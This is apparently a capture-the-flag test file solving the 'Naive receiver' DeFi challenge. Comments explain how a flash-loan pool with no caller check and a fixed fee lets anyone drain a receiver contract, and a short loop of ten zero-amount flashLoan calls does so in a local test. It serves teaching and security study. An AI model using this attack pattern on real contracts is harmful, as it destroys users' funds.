const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');

const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    /**
     * VULNERABILITY: Missing Access Control on Flash Loan Initiation
     * 
     * The NaiveReceiverLenderPool allows ANYONE to initiate a flash loan on behalf of ANY receiver
     * contract. Combined with a fixed 1 ETH fee per loan, this allows an attacker to drain a
     * receiver's funds by repeatedly calling flash loans with 0 borrowed amount.
     * 
     * HOW TO IDENTIFY THIS VULNERABILITY:
     * 1. Check who can initiate flash loans, is it only the receiver or anyone?
     * 2. Look for fixed fees that are charged regardless of loan amount
     * 3. Verify if the receiver contract has any protection against unwanted loans
     * 4. Check if there's validation that the caller is authorized by the receiver
     * 5. Look for missing access control modifiers or caller checks
     * 
     * KEY CODE TO ANALYZE:
     * In NaiveReceiverLenderPool.flashLoan():
     * - No check that msg.sender == borrower or is authorized by borrower
     * - Fixed fee of 1 ETH charged on every loan
     * - The receiver MUST pay the fee even if they didn't request the loan
     * 
     * ATTACK VECTOR:
     * An attacker can call flashLoan() multiple times with the victim's address as the
     * borrower, forcing them to pay 1 ETH fee each time until their balance is drained.
     * 
     * IMPACT:
     * - Complete loss of funds for the receiver contract (10 ETH)
     * - Denial of Service: receiver can't execute legitimate flash loans
     * - Griefing attack: attacker gains nothing but causes damage
     */

    const [deployer, user, attacker, ...otherAccounts] = accounts;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ether('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ether('10');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */
        this.pool = await LenderPool.new({ from: deployer });
        await web3.eth.sendTransaction({ from: deployer, to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await balance.current(this.pool.address)).to.be.bignumber.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee({ from: deployer })).to.be.bignumber.equal(ether('1'));

        this.receiver = await FlashLoanReceiver.new(this.pool.address, { from: user });
        await web3.eth.sendTransaction({ from: user, to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await balance.current(this.receiver.address)).to.be.bignumber.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        
        /**
         * THE EXPLOIT:
         * 
         * Looking at NaiveReceiverLenderPool.flashLoan():
         * ```solidity
         * function flashLoan(address borrower, uint256 borrowAmount) external {
         *     // No check on who can call this function!
         *     uint256 balanceBefore = address(this).balance;
         *     require(balanceBefore >= borrowAmount, "Not enough ETH");
         *     
         *     // Calls the borrower
         *     IFlashLoanReceiver(borrower).receiveEther{value: borrowAmount}(msg.sender);
         *     
         *     // Requires repayment + 1 ETH fee
         *     require(
         *         address(this).balance >= balanceBefore + fixedFee,
         *         "Flash loan hasn't been paid back"
         *     );
         * }
         * ```
         * 
         * CRITICAL FLAWS:
         * 1. Anyone can call flashLoan() with any borrower address
         * 2. The borrower MUST implement receiveEther() and pay the fee
         * 3. Even borrowing 0 ETH costs 1 ETH in fees
         * 
         * STEP BY STEP ATTACK:
         * 1. Attacker calls flashLoan(victim, 0) - borrows 0 ETH
         * 2. Victim's receiveEther() is called
         * 3. Victim must repay 0 ETH + 1 ETH fee = 1 ETH total
         * 4. Repeat 10 times to drain all 10 ETH from victim
         * 
         * PREVENTION:
         * - Add access control: only allow the borrower to initiate their own loans
         * - Implement a whitelist of authorized callers per receiver
         * - Allow receivers to set maximum fee limits
         * - Consider proportional fees based on loan amount
         * - Add a receiver-side check to reject unwanted loans
         */
        
        // The pool charges 1 ETH fee per flash loan
        // The receiver has 10 ETH, so we need 10 flash loans to drain it
        for(let i = 0; i < 10; i++) {
            // Call flash loan with 0 amount - still charges 1 ETH fee!
            await this.pool.flashLoan(this.receiver.address, 0, { from: attacker });
            
            /**
             * What happens in each iteration:
             * 1. Pool calls receiver.receiveEther{value: 0}(attacker)
             * 2. Receiver executes its logic (does nothing with 0 ETH)
             * 3. Receiver must have repaid 0 + 1 ETH fee
             * 4. 1 ETH moves from receiver to pool
             * 
             * After 10 iterations: receiver balance = 10 - 10 = 0 ETH
             */
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // All ETH has been drained from the receiver
        expect(
            await balance.current(this.receiver.address)
        ).to.be.bignumber.equal('0');
        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
